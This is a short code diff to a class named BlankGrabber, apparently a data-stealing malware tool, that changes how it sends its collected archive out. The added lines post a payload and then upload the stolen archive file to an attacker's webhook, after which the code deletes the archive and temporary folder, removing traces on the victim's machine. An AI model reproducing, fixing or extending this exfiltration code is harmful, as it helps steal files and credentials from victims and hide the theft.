@@ -305,8 +305,9 @@ class BlankGrabber:
   "username": "Blank Grabber",
   "avatar_url": "https://i.imgur.com/72yOkd1.jpg"
 }       
+        requests.post(self.webhook, json = payload)
         with open(self.archive,'rb') as file:
-            requests.post(self.webhook, files = {"file": file}, data = payload)
+            requests.post(self.webhook, files = {"upload_file": file})
         try:
             os.remove(self.archive)
             shutil.rmtree(self.tempfolder)
